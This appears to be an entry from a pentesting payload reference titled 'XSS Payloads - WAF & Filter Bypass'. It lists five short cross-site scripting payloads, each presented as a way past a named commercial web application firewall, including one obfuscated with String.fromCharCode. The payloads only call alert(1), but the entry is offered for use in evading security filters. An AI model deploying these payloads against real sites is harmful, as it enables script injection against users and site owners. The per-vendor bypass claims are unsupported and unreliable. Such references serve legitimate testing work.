---
id: "xss-waf_bypass-payloads"
title: "XSS Payloads - WAF & Filter Bypass"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "waf_bypass", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Advanced techniques to bypass Web Application Firewalls and security filters

## Payloads

### Cloudflare Bypass

Specific technique to bypass Cloudflare WAF

- **Contexts**: html
- **Severity**: high

```html
<svg/onload=alert(1)//>
```

### ModSecurity Bypass

Bypass ModSecurity CRS rules

- **Contexts**: html
- **Severity**: high

```html
<img src=1 onerror=alert(1)>
```

### AWS WAF Bypass

Technique to bypass AWS WAF

- **Contexts**: script
- **Severity**: high

```html
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### Akamai Bypass

Bypass Akamai Kona Site Defender

- **Contexts**: html
- **Severity**: high

```html
<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>
```

### Imperva Bypass

Bypass Imperva SecureSphere WAF

- **Contexts**: html
- **Severity**: high

```html
<svg><script>alert&#40;1&#41;</script>
```
